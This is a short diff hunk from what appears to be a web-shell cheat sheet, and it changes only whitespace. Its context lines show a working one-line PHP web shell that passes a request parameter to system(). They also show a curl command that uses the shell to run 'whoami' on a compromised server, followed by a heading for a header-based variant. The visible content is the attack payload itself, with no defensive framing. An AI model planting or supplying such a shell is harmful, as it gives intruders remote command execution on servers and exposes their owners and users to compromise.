@@ -1,6 +1,6 @@
 # simple shell using get
     <?php system($_REQUEST['c']); ?>
-then 
+then
     `curl http://example.com?c=whoami`
 
 # simple shell using http header
